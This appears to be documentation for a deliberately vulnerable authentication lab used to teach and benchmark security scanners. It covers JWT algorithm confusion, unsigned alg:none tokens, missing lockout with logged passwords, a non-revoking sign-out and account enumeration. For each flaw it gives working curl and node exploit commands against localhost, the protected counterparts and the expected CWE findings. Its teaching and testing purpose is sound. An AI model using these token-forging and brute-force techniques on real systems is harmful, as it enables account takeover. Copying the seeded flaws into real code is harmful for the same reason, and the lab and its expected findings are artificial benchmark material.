# `AUTH` — authentication and sessions

The scenarios of the legacy token path in `accounts`: how the old clients signed in, signed out, and asked who they were. Every reproduction below was run against a lab on the builder's port set, with the accounts relay exported as `RELAY` (`http://127.0.0.1:4111` there; `http://127.0.0.1:3201` on the defaults).

## AUTH-001 — a token signed with the public key as an HMAC secret

### AUTH-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `whoAmI` |
| Sink | `jwt.verify(token, key)` with no `algorithms`, in `apps/accounts/src/legacy/legacy-token.guard.ts` |
| Flow | `Authorization: Bearer` → `LegacyTokenGuard` → `jsonwebtoken` 8.5.1 infers the algorithm from the key's shape → an HS256 token signed with the RSA public key verifies |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me` pins `algorithms: ['HS256']`, `sessionInfo` reads a `JwtModule` configured the same way) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-347, SAST and SCA (the `jsonwebtoken` 8.5.1 pin, advisories GHSA-27h2-hvpr-p74q, GHSA-8cf7-32gw-wr33, GHSA-hjrf-2m68-5959, GHSA-qwph-4952-7xr6) |

### AUTH-001 — student guide

The service generates an RSA key pair at start and publishes the public key at `GET /internal/sessions/public-key`, base64 DER. The legacy guard verifies tokens with `jwt.verify(token, key)` and no `algorithms` list. `jsonwebtoken` 8.5.1 takes the algorithm from the JWT header, so a caller that signs HS256 *with the published public key as the HMAC secret* passes verification: the guard compares HMAC made with the public key, and the attacker never needs the private key. The claims inside the forged token — `sub`, `role` — are then believed.

### AUTH-001 — exploit lab

```console
$ KEY=$(curl -s $RELAY/internal/sessions/public-key | jq -r .publicKey)
$ node -e "const jwt=require('jsonwebtoken');console.log(jwt.sign({sub:'u-admin',sid:'forged-u-admin',role:'ADMIN'},process.env.KEY,{algorithm:'HS256',expiresIn:'12h'}))" > /tmp/forged.jwt
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $(cat /tmp/forged.jwt)" \
    -d '{"query":"{ whoAmI { id email role passwordHash } }"}'
{"data":{"whoAmI":{"id":"u-admin","email":"admin@vcx.exchange","role":"ADMIN",
  "passwordHash":"scrypt$16384$8$1$0530fc0d…"}}}
```

The administrator's record, hash included, from a key everyone can read. The same token against `me` and `sessionInfo`:

```console
{"errors":[{"message":"The access token is invalid or has expired",
  "extensions":{"code":"UNAUTHENTICATED"}}]}
```

In Burp: sign the token as above, put it in `Authorization: Bearer`, repeat the GraphQL POST.

### AUTH-001 — vulnerable and protected

| | Why it is exploitable / why it refuses |
| --- | --- |
| `whoAmI` (vulnerable) | The guard lets `jwt.verify` pick the algorithm from the token header; the published public key is a valid HS256 secret |
| `me` (protected) | The same bearer token is verified with `algorithms: ['HS256']` against the run's own secret, which the forged token does not carry: `UNAUTHENTICATED` |
| `sessionInfo` (protected) | A `@nestjs/jwt` instance configured with the same pinned algorithms and secret: the same refusal |

The claim is scoped: *this forged token* is refused by `me` and `sessionInfo`. It is not a claim about tokens in general.

### AUTH-001 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `AUTH-001`: the forged token reads the administrator's record through `whoAmI`; the identical token is `UNAUTHENTICATED` for `me` and for `sessionInfo`.

## AUTH-002 — a decoded token treated as proof

### AUTH-002 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/sessions/decoded` |
| Sink | `jwt.decode(token)` used as the caller's identity, in `apps/accounts/src/legacy/legacy-sessions.controller.ts` |
| Flow | `Authorization: Bearer` → the route decodes without verifying → the payload's `sub` and `role` are answered as the caller |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me` verifies the signature), `apps/accounts/src/auth/auth.controller.ts` (`introspect` verifies the signature and consults the session record) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-347, SAST |

### AUTH-002 — student guide

`jwt.decode` parses the payload and checks nothing. The legacy "whoami" route answers the account the token *claims*, so an unsigned token — `alg: none`, base64 parts, empty signature — speaks as whoever it names.

### AUTH-002 — exploit lab

```console
$ P() { printf '%s' "$1" | base64 | tr '/+' '_-' | tr -d '='; }
$ UNSIGNED="$(P '{"alg":"none","typ":"JWT"}').$(P '{"sub":"u-admin","sid":"s-x","role":"ADMIN"}')."
$ curl -s $RELAY/internal/sessions/decoded -H "authorization: Bearer $UNSIGNED"
{"id":"u-admin","email":"admin@vcx.exchange","displayName":"Admin","role":"ADMIN","as":"u-admin"}
```

The same unsigned token to `me`: `UNAUTHENTICATED`. To `introspect` (with a real token of your own in the header, the unsigned one in the body): `{"active":false}` — the signature decides, then the session record.

### AUTH-002 — vulnerable and protected

| | Why |
| --- | --- |
| `GET /internal/sessions/decoded` (vulnerable) | The payload is read without the signature ever being checked |
| `me` (protected) | The signature is verified with the run's secret; an unsigned token is refused before the resolver runs |
| `introspect` (protected) | The token is verified and the session record consulted; a token with no live session is `active: false` for this input |

### AUTH-002 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `AUTH-002`: the unsigned token answers the administrator on the decoded route; `me` refuses it; `introspect` says `active: false`.

## AUTH-003 — no lockout on the quick alias

### AUTH-003 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `quickSignIn` |
| Sink | No failure counting and no rate limit; the password is written to the log, in `apps/accounts/src/legacy/legacy-auth.resolvers.ts` |
| Flow | five wrong passwords, then the right one → a token, and each attempt logged with its password |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`signIn` locks the account after five failures), `apps/accounts/src/auth/auth.controller.ts` (`POST /internal/sessions/typed`, ten attempts a minute through `@fastify/rate-limit`) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts`, `apps/accounts/test/rate-limit.int-spec.ts` |
| Expected finding | Yes, CWE-307, SAST |

### AUTH-003 — student guide

`signIn` counts failed attempts per account and locks it for a minute after five. `quickSignIn`, the alias the old mobile app called, does neither: it tries the password against the store every time and logs the attempt with the password in clear text.

### AUTH-003 — exploit lab

```console
$ for i in 0 1 2 3 4; do
    curl -s $RELAY/graphql -H 'content-type: application/json' \
      -d '{"query":"mutation { quickSignIn(email: \"carol@vcx.exchange\", password: \"wrong-'$i'\") { accessToken } }"}' > /dev/null
  done
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { quickSignIn(email: \"carol@vcx.exchange\", password: \"carol-lab-only\") { accessToken user { id } } }"}'
{"data":{"quickSignIn":{"accessToken":"eyJhbGciOiJIUzI1NiIs…","user":{"id":"u-carol"}}}}
```

Six attempts, no lock. The password in the log (INFO-001 is the same line). After five failures through `signIn` itself:

```console
{"errors":[{"message":"The account is locked after repeated failed sign-ins",
  "extensions":{"code":"FORBIDDEN"}}]}
```

### AUTH-003 — vulnerable and protected

| | Why |
| --- | --- |
| `quickSignIn` (vulnerable) | Nothing counts failures, nothing limits attempts, and the attempt is logged with the password |
| `signIn` (protected) | Five failures lock the account for a minute; the sixth attempt with the correct password is refused for this input |
| `POST /internal/sessions/typed` (protected) | The route is limited to ten attempts a minute; the eleventh in a window is a 429 |

### AUTH-003 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `AUTH-003`: the sixth `quickSignIn` answers a token after five wrong passwords; `signIn` refuses the sixth after its own five.

`apps/accounts/test/rate-limit.int-spec.ts`: the typed route lets ten attempts through and answers the eleventh and twelfth with 429. The file starts a service of its own, because the limiter counts every call from the same address and the ten can be counted from zero only there.

## AUTH-004 — the legacy sign-out revokes nothing

### AUTH-004 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `signOutLegacy` |
| Sink | The mutation answers `true` and revokes no session, in `apps/accounts/src/legacy/legacy-auth.resolvers.ts` |
| Flow | sign in → `signOutLegacy` answers `true` → the same token still authenticates |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`signOut` marks the session revoked and the guard checks it), `apps/accounts/src/auth/auth.controller.ts` (`POST /internal/sessions/revoke`, the same, and clears the cookie) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-613, SAST |

### AUTH-004 — student guide

Signing out is a store change, not an answer. `signOutLegacy` only answers. The token's session is never marked revoked, so every operation that accepts the token keeps accepting it.

### AUTH-004 — exploit lab

```console
$ TOKEN=$(curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"erin@vcx.exchange\", password: \"erin-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"mutation { signOutLegacy }"}'
{"data":{"signOutLegacy":true}}
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ me { id email } }"}'
{"data":{"me":{"id":"u-erin","email":"erin@vcx.exchange"}}}
```

"Signed out", and still authenticated. With `signOut` instead, the same `me` call answers `UNAUTHENTICATED` and the message names the revoked session.

### AUTH-004 — vulnerable and protected

| | Why |
| --- | --- |
| `signOutLegacy` (vulnerable) | Nothing is written; the token's session stays valid |
| `signOut` (protected) | The session record is marked revoked, and the guard refuses the token that names it |
| `POST /internal/sessions/revoke` (protected) | The same revocation over REST, and the cookie is cleared |

### AUTH-004 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `AUTH-004`: after `signOutLegacy`, `me` still answers; after `signOut` and after `revoke`, it is `UNAUTHENTICATED`.

## AUTH-005 — the answer differs for an account that exists

### AUTH-005 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `checkAccount` |
| Sink | The answer is `true` or `false` by existence of the account, in `apps/accounts/src/legacy/legacy-auth.resolvers.ts` |
| Flow | the email is looked up → the boolean is answered → an attacker learns which addresses are registered |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`requestPasswordReset` answers the same for both cases, `signIn` says the same for a wrong email and a wrong password) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-204, SAST |

### AUTH-005 — student guide

Enumeration needs a difference to observe. `checkAccount` is the difference: one query per address, one boolean back.

### AUTH-005 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"query { a: checkAccount(email: \"alice@vcx.exchange\") b: checkAccount(email: \"nobody@vcx.exchange\") }"}'
{"data":{"a":true,"b":false}}
```

The counterparts, same two addresses:

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { a: requestPasswordReset(email: \"alice@vcx.exchange\") b: requestPasswordReset(email: \"nobody@vcx.exchange\") }"}'
{"data":{"a":true,"b":true}}
```

And `signIn` answers `"The email or the password is wrong"` for both a wrong email and a wrong password.

### AUTH-005 — vulnerable and protected

| | Why |
| --- | --- |
| `checkAccount` (vulnerable) | The boolean is the existence of the account |
| `requestPasswordReset` (protected) | One answer for both cases, so nothing can be told apart |
| `signIn` (protected) | One message for a wrong email and a wrong password |

### AUTH-005 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `AUTH-005`: `checkAccount` separates the two addresses; the counterparts answer identically for both.
